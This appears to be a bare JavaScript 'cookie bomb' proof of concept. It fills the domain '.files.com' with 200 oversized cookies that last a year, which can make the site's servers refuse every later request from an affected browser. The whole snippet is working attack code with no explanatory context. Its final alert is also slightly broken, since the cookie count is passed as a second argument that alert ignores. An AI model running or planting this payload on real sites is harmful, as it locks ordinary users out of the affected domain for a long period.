const COOKIE_COUNT = 200;
const COOKIE_SIZE  = 100; 

const PATH   = "/";                 
const DOMAIN = ".files.com";                  
const MAX_AGE = 60 * 60 * 24 * 365;  

for (let i = 0; i < COOKIE_COUNT; i++) {
  let cookie = `cookie_${i}=${'x'.repeat(COOKIE_SIZE)}`;

  if (PATH)   cookie += `; path=${PATH}`;
  if (DOMAIN) cookie += `; domain=${DOMAIN}`;
  if (MAX_AGE) cookie += `; max-age=${MAX_AGE}`;

  document.cookie = cookie;
}

alert('Total cookies Added:', document.cookie.split(';').length);
